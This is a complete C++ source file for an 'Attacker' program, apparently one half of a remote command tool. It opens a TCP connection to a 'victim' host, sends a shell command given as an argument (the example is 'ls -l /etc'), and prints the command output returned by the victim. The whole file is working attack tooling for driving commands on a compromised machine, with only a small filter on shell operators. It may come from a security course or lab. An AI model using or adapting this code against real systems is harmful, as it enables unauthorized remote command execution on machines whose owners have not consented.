#include <iostream>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <cstring>
#define DEFAULTFDVALUE -1
#define NUMBOFARGS 5
#define BUFFERSIZE 1024
#define EOFINDICATOR "EOF\n"

using namespace std;

class Attacker{
public:
    // class members
    int socketFD;
    const int port;
    const string ipAddress, command;

    // Constructor
    Attacker(const string ipAddress, const int port, const string command):
    socketFD(DEFAULTFDVALUE),ipAddress(ipAddress),port(port),command(command){}
    // Destructor
    ~Attacker(){ close_socket(socketFD);}

    // function prototypes
    int create_socket();
    void attempt_socket_connection(int socketFD);
    void send_request(int socketFD, string command);
    void print_response(int socketFD);
    void close_socket(int socketFD);
};
int main(int argc, char*argv[]) {
    // validate command line arguments
    if(argc != NUMBOFARGS){
        cerr << "Incorrect amount of command line arguments,only provide IP Address, port,--cmd flag and command\n" 
             << "Note: Wrap your entire command in quotes to avoid shell interpretation issues.\n" 
             << "Example: ./attacker 127.0.0.1 4444 --cmd \"ls -l /etc\"\n" 
             << endl;
        return EXIT_FAILURE;
    }

    string ipAddress = argv[1];
    int port = stoi(argv[2]);
    string flag = argv[3];
    
    if (flag != "--cmd") {
        cerr << "Error: Expected '--cmd' as the third argument." << endl;
        return EXIT_FAILURE;
    }

    string command = argv[4];

    // Optional: Check for dangerous patterns
    vector<string> disallowed = {"<", ">", ">>", "|", "&&", "||"};
    for (const string& pattern : disallowed) {
        if (command.find(pattern) != string::npos) {
            cerr << "Error: Command contains disallowed pattern: " << pattern << endl;
            return EXIT_FAILURE;
        }
    }

    cout << "Attacker has started" << endl;

    Attacker *attacker = new Attacker(ipAddress,port,command);
    int socketFD = attacker->create_socket();
    attacker->attempt_socket_connection(socketFD);
    attacker->send_request(socketFD,command);
    attacker->print_response(socketFD);
    delete(attacker);

    // Return 0 to indicate the program ended successfully
    return 0;
}

int Attacker::create_socket() {

    // initialize the socket
    socketFD = socket(AF_INET,SOCK_STREAM,0);
    // check for error
    if(socketFD == -1){
        cerr << "Error in creating socket: " << strerror(errno) <<endl;
        exit(EXIT_FAILURE);
    }
    cout << "Socket created successfully" << endl;
    return socketFD;
}

void Attacker::attempt_socket_connection(int socketFD) {

    // initialize sockaddr_in structure
    struct sockaddr_in addr;
    memset(&addr,0,sizeof(addr));
    addr.sin_family = AF_INET;

    if (inet_pton(AF_INET, ipAddress.c_str(), &addr.sin_addr) <= 0) {
        cerr << "Invalid IP address" << endl;
        exit(EXIT_FAILURE);
    }
    addr.sin_port = htons(port);

    // attempt connecting
    if(connect(socketFD,(struct sockaddr*)&addr,sizeof(addr)) == -1){
        cerr << "Error in connecting to victim socket: "<< strerror(errno) <<endl;
        exit(EXIT_FAILURE);
    }

    cout << "Successfully connected at IP: " << ipAddress <<" and port: "<< port << endl;
}


void Attacker::send_request(int socketFD, string command) {

    // construct request and send
    string requestContents = command;

    requestContents += EOFINDICATOR;

    // send request
    ssize_t request = send(socketFD,requestContents.c_str(),requestContents.size(),0);

    if(request == -1){
        cerr << "Error in sending request to victim: "<< strerror(errno) <<endl;
        exit(EXIT_FAILURE);
    }

    cout << "Successfully sent command:" << command <<  " to the victim" << endl;
}

void Attacker::print_response(int socketFD) {
    char buffer[BUFFERSIZE];
    string response;
    ssize_t bytesRead;

    while ((bytesRead = recv(socketFD, buffer, BUFFERSIZE - 1, 0)) > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;

        if (response.find(EOFINDICATOR) != string::npos) {
            response.erase(response.find(EOFINDICATOR));
            break;
        }
    }

    if (bytesRead == -1) {
        cerr << "Error reading response from victim: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }

    cout << "Output from victim:\n" << response << endl;
}



void Attacker::close_socket(int socketFD) {
    if(close(socketFD) == -1){
        cerr << "Error closing socket: " << strerror(errno) << endl;
        exit(EXIT_FAILURE);
    }
    cout << "Socket closed successfully" << endl;
}